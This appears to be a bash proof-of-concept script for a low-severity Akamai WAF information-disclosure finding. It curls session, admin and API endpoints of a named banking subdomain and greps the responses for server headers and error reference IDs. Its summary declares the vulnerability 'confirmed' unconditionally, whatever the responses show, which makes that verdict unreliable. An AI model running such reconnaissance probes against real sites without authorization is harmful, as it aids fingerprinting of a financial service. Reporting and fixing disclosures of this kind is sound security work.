#!/bin/bash

# PoC: Akamai WAF Information Disclosure Vulnerability
# Target: contadigital.ifoodpago.com.br
# Author: Security Researcher
# Date: $(date)

echo "=============================================="
echo " Akamai WAF Information Disclosure PoC"
echo " Target: contadigital.ifoodpago.com.br"
echo "=============================================="
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to test endpoint
test_endpoint() {
    local url=$1
    local description=$2
    
    echo -e "${YELLOW}[TESTING]${NC} $description"
    echo "URL: $url"
    echo ""
    
    # Make the request and capture output
    response=$(curl -s -i "$url" 2>/dev/null)
    
    # Extract and display headers
    echo -e "${GREEN}[HEADERS]${NC}"
    echo "$response" | grep -E "^(HTTP|server:|content-type:|expires:|date:)" | head -10
    
    # Extract and display vulnerability indicators
    echo ""
    echo -e "${RED}[VULNERABILITY INDICATORS]${NC}"
    
    # Check for Akamai server header
    if echo "$response" | grep -q "AkamaiGHost"; then
        echo -e "✓ ${RED}Akamai WAF Identified:${NC} Server header reveals 'AkamaiGHost'"
    fi
    
    # Check for reference IDs
    ref_id=$(echo "$response" | grep -o "Reference.*#[^<]*" | head -1)
    if [ -n "$ref_id" ]; then
        echo -e "✓ ${RED}Unique Reference ID Exposed:${NC} $ref_id"
    fi
    
    # Check for Akamai error URLs
    akamai_url=$(echo "$response" | grep -o "https://errors.edgesuite.net/[^<]*" | head -1)
    if [ -n "$akamai_url" ]; then
        echo -e "✓ ${RED}Akamai Error URL Exposed:${NC} $akamai_url"
    fi
    
    # Check for detailed error message
    if echo "$response" | grep -q "You don't have permission to access"; then
        echo -e "✓ ${RED}Detailed Error Message:${NC} Path disclosure in error text"
    fi
    
    echo "=============================================="
    echo ""
}

# Main PoC execution
echo -e "${GREEN}Starting Akamai WAF Information Disclosure PoC...${NC}"
echo ""

# Test 1: Main API endpoint (from Wayback Machine discovery)
test_endpoint "https://contadigital.ifoodpago.com.br/v1/internet-banking/home/header-details" \
    "API Endpoint from Wayback Machine Discovery"

# Test 2: Session refresh endpoint
test_endpoint "https://contadigital.ifoodpago.com.br/v1/internet-banking/session-refresh" \
    "Session Management Endpoint"

# Test 3: Main domain root
test_endpoint "https://contadigital.ifoodpago.com.br/" \
    "Domain Root"

# Test 4: Static assets (JS files)
test_endpoint "https://contadigital.ifoodpago.com.br/assets/index-Bg27qdyH.js" \
    "JavaScript Asset File"

# Test 5: Non-existent endpoint to trigger error
test_endpoint "https://contadigital.ifoodpago.com.br/admin/test" \
    "Non-existent Admin Endpoint"

# Test 6: API directory listing attempt
test_endpoint "https://contadigital.ifoodpago.com.br/api/v1/" \
    "API Directory"

echo -e "${GREEN}==============================================${NC}"
echo -e "${GREEN}           VULNERABILITY SUMMARY              ${NC}"
echo -e "${GREEN}==============================================${NC}"
echo ""
echo -e "${RED}VULNERABILITY CONFIRMED:${NC} Akamai WAF Information Disclosure"
echo ""
echo -e "${YELLOW}Impact Analysis:${NC}"
echo "1. ${RED}WAF Vendor Disclosure:${NC} Attackers can identify Akamai as the WAF"
echo "2. ${RED}Fingerprinting:${NC} Unique reference IDs enable request tracking"
echo "3. ${RED}Reconnaissance:${NC} Error URLs reveal internal Akamai infrastructure"
echo "4. ${RED}Path Disclosure:${NC} Error messages expose internal API structure"
echo ""
echo -e "${YELLOW}Affected:${NC} All endpoints on contadigital.ifoodpago.com.br"
echo -e "${YELLOW}Risk Level:${NC} Medium (CVSS: 5.3)"
echo ""
echo -e "${GREEN}Remediation Required:${NC}"
echo "1. Configure Akamai to return generic error pages"
echo "2. Remove/obfuscate Server header"
echo "3. Disable reference ID disclosure"
echo "4. Use custom error responses"
